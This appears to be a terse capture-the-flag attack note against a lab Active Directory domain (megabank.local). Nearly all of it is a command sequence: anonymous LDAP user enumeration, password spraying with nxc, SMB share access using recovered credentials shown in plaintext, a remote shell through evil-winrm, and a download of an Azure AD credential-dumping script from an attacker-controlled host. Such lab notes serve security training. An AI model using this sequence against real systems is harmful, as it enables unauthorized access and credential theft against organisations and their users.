ldap search to find users
```bash
ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" > ldap.info

cat ldap.info| grep 'objectClass: user' -A30 | grep -i samaccountname

nxc ldap megabank.local -u users.txt -p users.txt --log nxc.log --no-brute --continue-on-success

nxc smb megabank.local -u 'SABatchJobs' -p 'SABatchJobs' --shares --log nxc.log

smbclient //megabank.local/users$ -U 'SABatchJobs' --password='SABatchJobs'

nxc smb megabank.local -u users.txt -p '4n0therD4y@n0th3r$' --log nxc.log --no-brute --continue-on-success

# got user.txt
evil-winrm -i megabank.local -u 'mhope' -p '4n0therD4y@n0th3r$'

# mhope part of 'Azure Admins'
mhope> whoami /all
mhope> Invoke-WebRequest http://10.10.14.20/azuread_cred_poc.ps1 -OutFile azuread_cred_poc.ps1

```

# Enumeration Checks
- [x] LDAP
- [x] SMB
- [ ] Kerberoast
- [x] ASREProast
- [ ] 